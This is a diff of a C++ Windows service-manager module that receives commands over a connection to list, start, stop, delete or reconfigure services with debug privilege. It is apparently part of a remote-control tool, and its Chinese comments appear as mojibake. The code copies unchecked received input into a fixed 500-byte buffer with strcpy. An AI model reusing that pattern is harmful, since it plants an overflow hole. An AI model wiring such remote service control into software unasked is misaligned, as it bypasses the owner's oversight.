@@ -1,4 +1,4 @@
-Ôªø// SerManager.cpp: implementation of the CSerManager class.
+// SerManager.cpp: implementation of the CSerManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -11,14 +11,14 @@
 //////////////////////////////////////////////////////////////////////
 enum
 {
-	COMMAND_SSLIST = 1,				// ÊúçÂä°ÂàóË°®
-	COMMAND_STARTSERVERICE,			// ÂêØÂä®ÊúçÂä°
-	COMMAND_STOPSERVERICE,			// ÂÅúÊ≠¢ÊúçÂä°
-	COMMAND_DELETESERVERICE,		// Âà†Èô§ÊúçÂä°
-	COMMAND_CREATSERVERICE,			// ÂàõÂª∫ÊúçÂä°
-	COMMAND_AUTOSERVERICE,			// Ëá™ÂêØÂä®
-	COMMAND_HANDSERVERICE,			// ÊâãÂä®
-	COMMAND_DISABLESERVERICE		// Á¶ÅÊ≠¢
+	COMMAND_SSLIST = 1,				// ∑˛ŒÒ¡–±Ì
+	COMMAND_STARTSERVERICE,			// ∆Ù∂Ø∑˛ŒÒ
+	COMMAND_STOPSERVERICE,			// Õ£÷π∑˛ŒÒ
+	COMMAND_DELETESERVERICE,		// …æ≥˝∑˛ŒÒ
+	COMMAND_CREATSERVERICE,			// ¥¥Ω®∑˛ŒÒ
+	COMMAND_AUTOSERVERICE,			// ◊‘∆Ù∂Ø
+	COMMAND_HANDSERVERICE,			//  ÷∂Ø
+	COMMAND_DISABLESERVERICE		// Ω˚÷π
 };
 extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);
 //////////////////////////////////////////////////////////////////////
@@ -40,22 +40,22 @@ void CSerManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_SSLIST:
 		SendServicesList();
 		break;
-	case COMMAND_STARTSERVERICE:  //ÂêØÂä®ÊúçÂä°
+	case COMMAND_STARTSERVERICE:  //∆Ù∂Ø∑˛ŒÒ
 		StartStopService((LPBYTE)lpBuffer + 1, nSize - 1,TRUE);
 		break;
-	case COMMAND_STOPSERVERICE:   //ÂÅúÊ≠¢ÊúçÂä°
+	case COMMAND_STOPSERVERICE:   //Õ£÷π∑˛ŒÒ
 		StartStopService((LPBYTE)lpBuffer + 1, nSize - 1,NULL);
 		break;
-	case COMMAND_DELETESERVERICE:  //Âà†Èô§ÊúçÂä°
+	case COMMAND_DELETESERVERICE:  //…æ≥˝∑˛ŒÒ
 		DeleteService((LPBYTE)lpBuffer + 1, nSize - 1);
 		break;
-	case COMMAND_AUTOSERVERICE:     //Ëá™Âä®ÊúçÂä°
+	case COMMAND_AUTOSERVERICE:     //◊‘∂Ø∑˛ŒÒ
 		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 2);
 		break;
-	case COMMAND_HANDSERVERICE:     //ÊâãÂä®ÊúçÂä°
+	case COMMAND_HANDSERVERICE:     // ÷∂Ø∑˛ŒÒ
 		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 1);
 		break;
-	case COMMAND_DISABLESERVERICE:  //Á¶ÅÁî®ÊúçÂä°
+	case COMMAND_DISABLESERVERICE:  //Ω˚”√∑˛ŒÒ
 		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 0);
 		break;
 	}
@@ -72,7 +72,7 @@ void CSerManager::SendServicesList()
 	LocalFree(lpBuffer);
 }
 
-void CSerManager::DisableService(LPBYTE lpBuffer, UINT nSize, UCHAR strn)  // strn=0 Á¶ÅÁî® strn=1Ëá™Âä® strn=2ÊâãÂä® 
+void CSerManager::DisableService(LPBYTE lpBuffer, UINT nSize, UCHAR strn)  // strn=0 Ω˚”√ strn=1◊‘∂Ø strn=2 ÷∂Ø 
 {
 	EnablePrivilege(SE_DEBUG_NAME, TRUE);
 	SC_HANDLE scm;
@@ -85,22 +85,22 @@ void CSerManager::DisableService(LPBYTE lpBuffer, UINT nSize, UCHAR strn)  // st
 	char *ServerName=NULL;
 	strcpy(temp,(char*)(lpBuffer));
 	ServerName = temp;
-	service=OpenService(scm,ServerName,SERVICE_CHANGE_CONFIG);  // ÊâìÂºÄwwwÊúçÂä°
+	service=OpenService(scm,ServerName,SERVICE_CHANGE_CONFIG);  // ¥Úø™www∑˛ŒÒ
     //BOOL isSuccess=QueryServiceStatus(service,&status);
 
     SC_LOCK sclLock; 
     DWORD  dwStartType; 
     sclLock = LockServiceDatabase(scm); 
 
-	if(strn==0)       //Á¶ÅÁî®ÊúçÂä°
+	if(strn==0)       //Ω˚”√∑˛ŒÒ
 	{
         dwStartType = SERVICE_DISABLED;
 	}
-	else if(strn==1)  //ÊâãÂä®ÊúçÂä°
+	else if(strn==1)  // ÷∂Ø∑˛ŒÒ
 	{
 		dwStartType = SERVICE_DEMAND_START;
 	}
-	else if(strn==2)  //Ëá™Âä®ÊúçÂä°
+	else if(strn==2)  //◊‘∂Ø∑˛ŒÒ
 	{
 		dwStartType = SERVICE_AUTO_START;
 	}
@@ -123,13 +123,13 @@ void CSerManager::DisableService(LPBYTE lpBuffer, UINT nSize, UCHAR strn)  // st
 	CloseServiceHandle(service );
 	CloseServiceHandle(scm);
 	
-	// Á®çÁ®çSleep‰∏ãÔºåÈò≤Ê≠¢Âá∫Èîô
+	// …‘…‘Sleepœ¬£¨∑¿÷π≥ˆ¥Ì
  	Sleep(200);
 	SendServicesList();
 	EnablePrivilege(SE_DEBUG_NAME, FALSE);
 }
 
-void CSerManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //Âà†Èô§ÊúçÂä°
+void CSerManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //…æ≥˝∑˛ŒÒ
 {
 	EnablePrivilege(SE_DEBUG_NAME, TRUE);
 	SC_HANDLE schManager;
@@ -156,38 +156,38 @@ void CSerManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //Âà†Èô§ÊúçÂä°
 	CloseServiceHandle(schService );
 	CloseServiceHandle(schManager);
 	
-	// Á®çÁ®çSleep‰∏ãÔºåÈò≤Ê≠¢Âá∫Èîô
+	// …‘…‘Sleepœ¬£¨∑¿÷π≥ˆ¥Ì
 	Sleep(200);
 	SendServicesList();
 	EnablePrivilege(SE_DEBUG_NAME, FALSE);
 }
 
-void CSerManager::StartStopService(LPBYTE lpBuffer, UINT nSize ,BOOL strp)  //ÂêØÂä® ÂÅúÊ≠¢ÊúçÂä°
+void CSerManager::StartStopService(LPBYTE lpBuffer, UINT nSize ,BOOL strp)  //∆Ù∂Ø Õ£÷π∑˛ŒÒ
 {
 	EnablePrivilege(SE_DEBUG_NAME, TRUE);
 	SC_HANDLE scm;
     SC_HANDLE service;
     SERVICE_STATUS status;
 
- 	scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);  // ÊâìÂºÄÊúçÂä°ÁÆ°ÁêÜÂØπË±°
+ 	scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);  // ¥Úø™∑˛ŒÒπ‹¿Ì∂‘œÛ
 	
 	char temp[500];
 	char *ServerName=NULL;
 	strcpy(temp,(char*)(lpBuffer));
 	ServerName = temp;
 
-	service=OpenService(scm,ServerName,SERVICE_QUERY_STATUS|SERVICE_START|SERVICE_STOP);  // ÊâìÂºÄwwwÊúçÂä°
+	service=OpenService(scm,ServerName,SERVICE_QUERY_STATUS|SERVICE_START|SERVICE_STOP);  // ¥Úø™www∑˛ŒÒ
 
     BOOL isSuccess=QueryServiceStatus(service,&status);
 
-	if(strp==TRUE)  //ÂêØÂä®ÊúçÂä°
+	if(strp==TRUE)  //∆Ù∂Ø∑˛ŒÒ
 	{
-        if ( status.dwCurrentState==SERVICE_STOPPED )  //ÊúçÂä°ÂÅúÊ≠¢Áä∂ÊÄÅ Â∞±ÂêØÂä®ÊúçÂä°
+        if ( status.dwCurrentState==SERVICE_STOPPED )  //∑˛ŒÒÕ£÷π◊¥Ã¨ æÕ∆Ù∂Ø∑˛ŒÒ
 		{
 		    isSuccess=StartService(service,NULL,NULL);
 		}
 	}
-	else    //ÂÅúÊ≠¢ÊúçÂä°
+	else    //Õ£÷π∑˛ŒÒ
 	{
 	    if ( status.dwCurrentState !=SERVICE_STOPPED )
 		{
@@ -198,7 +198,7 @@ void CSerManager::StartStopService(LPBYTE lpBuffer, UINT nSize ,BOOL strp)  //Âê
 	CloseServiceHandle(service );
 	CloseServiceHandle(scm);
 	
-	// Á®çÁ®çSleep‰∏ãÔºåÈò≤Ê≠¢Âá∫Èîô
+	// …‘…‘Sleepœ¬£¨∑¿÷π≥ˆ¥Ì
  	Sleep(200);
 	SendServicesList();
 	EnablePrivilege(SE_DEBUG_NAME, FALSE);
@@ -245,28 +245,28 @@ LPBYTE CSerManager::getServicesList()
 		if (lpServiceConfig->dwStartType == 2)
 		{
 			ZeroMemory(szServiceStartType, sizeof(szServiceStartType));
-			lstrcat(szServiceStartType, "Ëá™Âä®");
+			lstrcat(szServiceStartType, "◊‘∂Ø");
 		}
 		else if (lpServiceConfig->dwStartType == 3)
 		{
 			ZeroMemory(szServiceStartType, sizeof(szServiceStartType));
-			lstrcat(szServiceStartType, "ÊâãÂä®");
+			lstrcat(szServiceStartType, " ÷∂Ø");
 		}
 		else if (lpServiceConfig->dwStartType == 4)
 		{
 			ZeroMemory(szServiceStartType, sizeof(szServiceStartType));
-			lstrcat(szServiceStartType, "Á¶ÅÁî®");
+			lstrcat(szServiceStartType, "Ω˚”√");
 		}
 		
 		if (lpServices[i].ServiceStatus.dwCurrentState != SERVICE_STOPPED)
 		{
 			ZeroMemory(szServiceState, sizeof(szServiceState));
-			lstrcat(szServiceState, "ÂêØÂä®");
+			lstrcat(szServiceState, "∆Ù∂Ø");
 		}
 		else
 		{
 			ZeroMemory(szServiceState, sizeof(szServiceState));
-			//lstrcat(szServiceState, "ÂÅúÊ≠¢");
+			//lstrcat(szServiceState, "Õ£÷π");
 		}
 		
 		dwLength = lstrlen(lpServices[i].lpDisplayName) + 1 +
